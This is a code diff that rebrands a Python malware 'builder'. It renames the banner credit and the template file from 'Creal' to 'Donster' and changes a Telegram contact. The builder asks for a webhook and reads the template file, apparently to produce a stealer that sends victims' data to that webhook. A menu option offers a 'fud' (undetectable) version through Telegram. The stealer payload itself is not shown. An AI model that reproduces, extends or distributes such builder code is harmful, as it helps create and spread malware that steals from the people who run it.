@@ -9,13 +9,12 @@ os.system('clear' if os.name == 'posix' else 'cls')
 
 intro = """
 
- ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀█▄   ▄▀▀▀▀▄     
-█ █    ▌ █   █   █ ▐  ▄▀   ▐ ▐ ▄▀ ▀▄ █    █      
-▐ █      ▐  █▀▀█▀    █▄▄▄▄▄    █▄▄▄█ ▐    █         by ayhu & artonus
-  █       ▄▀    █    █    ▌   ▄▀   █     █       
- ▄▀▄▄▄▄▀ █     █    ▄▀▄▄▄▄   █   ▄▀    ▄▀▄▄▄▄▄▄▀ 
-█     ▐  ▐     ▐    █    ▐   ▐   ▐     █         
-▐                   ▐                  ▐         
+    ____  ____  _   _______________________ 
+   / __ \/ __ \/ | / / ___/_  __/ ____/ __ \
+  / / / / / / /  |/ /\__ \ / / / __/ / /_/ /     Developed by Donster
+ / /_/ / /_/ / /|  /___/ // / / /___/ _, _/ 
+/_____/\____/_/ |_//____//_/ /_____/_/ |_|  
+                                                 
 
                 > Press Enter                                         
 
@@ -26,13 +25,12 @@ Anime.Fade(Center.Center(intro), Colors.black_to_red, Colorate.Vertical, interva
 
 print(f"""{Fore.LIGHTRED_EX}
 
- ▄▀▄▄▄▄   ▄▀▀▄▀▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀█▄   ▄▀▀▀▀▄     
-█ █    ▌ █   █   █ ▐  ▄▀   ▐ ▐ ▄▀ ▀▄ █    █      
-▐ █      ▐  █▀▀█▀    █▄▄▄▄▄    █▄▄▄█ ▐    █         by ayhu & artonus
-  █       ▄▀    █    █    ▌   ▄▀   █     █       
- ▄▀▄▄▄▄▀ █     █    ▄▀▄▄▄▄   █   ▄▀    ▄▀▄▄▄▄▄▄▀ 
-█     ▐  ▐     ▐    █    ▐   ▐   ▐     █         
-▐                   ▐                  ▐    
+    ____  ____  _   _______________________ 
+   / __ \/ __ \/ | / / ___/_  __/ ____/ __ \
+  / / / / / / /  |/ /\__ \ / / / __/ / /_/ /     Developed by Donster
+ / /_/ / /_/ / /|  /___/ // / / /___/ _, _/ 
+/_____/\____/_/ |_//____//_/ /_____/_/ |_|  
+                                            
 
             Welcome to builder
 
@@ -54,7 +52,7 @@ while True:
         os.system("cls || clear")
         webhook = input(Fore.CYAN + "\nEnter Your Webhook: " + Style.RESET_ALL)
 
-        filename = "Creal.py"
+        filename = "Donster.py"
         filepath = os.path.join(os.getcwd(), filename)
         with open(filepath, "r", encoding="utf-8") as f:
             content = f.read()
@@ -91,7 +89,7 @@ while True:
                 Write.Print("\nYou have entered invalid. Please try again.", Colors.red_to_purple)
 
     elif choice == "2":
-        Write.Print("\nWe can share the fud for free but not now if you want to get it now: https://t.me/crealdevelopment", Colors.red_to_yellow)
+        Write.Print("\nWe can share the fud for free but not now if you want to get it now: https://t.me/Donny", Colors.red_to_yellow)
 
     elif choice == "3":
         Write.Print("\nExiting the program...", Colors.red_to_yellow)
